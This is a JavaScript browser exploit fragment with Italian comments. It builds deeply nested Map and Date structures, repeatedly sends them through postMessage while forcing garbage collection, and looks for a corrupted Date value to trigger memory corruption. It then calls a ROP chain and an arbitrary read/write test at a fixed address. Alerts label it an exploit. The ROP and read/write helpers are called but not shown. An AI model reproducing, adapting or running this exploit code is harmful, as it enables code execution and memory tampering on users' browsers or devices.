// Funzione per creare una struttura di oggetti con controllo della memoria
function createObjectStructure(num_elems) {
    let root = new Map();
    let msg = root;
    let foo = [];
    
    // Ridurre il numero di oggetti in fase iniziale
    const maxElems = Math.min(num_elems, 200); // Limita la dimensione della struttura per evitare errore di memoria insufficiente

    for (let i = 0; i < 100; i++) {
        foo.push(new Date(0xffff));  // Usa oggetti piÃ¹ piccoli per non sovraccaricare la memoria
    }

    for (let i = 0; i < maxElems; i++) {
        const d = new Date(i);
        const map = new Map();
        msg.set(d, [map, foo]);
        msg = map;
    }

    // Attiva il garbage collector per rilasciare la memoria usata
    gc();
    return root;
}

// Modifica della funzione principale
export async function main() {
    alert("Exploit main function started");

    const num_elems = 500;  // Numero di oggetti da creare per test ridotto
    let root = createObjectStructure(num_elems); // Riduci la struttura iniziale
    let msg = root;
    let data2 = null;
    let idx = null;

    alert("Object structure created");

    let found = false;
    while (!found) {
        let data = null;
        const prom = new Promise(resolve => {
            addEventListener('message', event => {
                data = event;
                resolve();
            }, { once: true });
        });

        postMessage(msg, origin);  // Invia il messaggio
        await prom;  // Attende che il messaggio venga ricevuto
        data = data.data;

        gc();  // Chiamata per liberare memoria
        await sleep(500);  // Rallenta l'esecuzione

        let i;
        try {
            for (i = 0; i < num_elems; i++) {
                if (data.keys().next().value.getTime() === 0xffff) {
                    idx = i;
                    found = true;
                    break;
                }
                data = data.values().next().value[0];
            }
        } catch (e) {
            alert("Error during message processing: " + e.message);
            break;
        }
    }

    alert('Exploit triggered, try crash');
    alert('[+] idx: ' + idx);

    // Esegui la ROP chain e il test RW
    let rop = ropChain();
    rwTest(0xdeadbeef, 0x1337);  // Esegui il test di lettura/scrittura a indirizzo specifico
    alert("ROP chain and RW test completed");
}
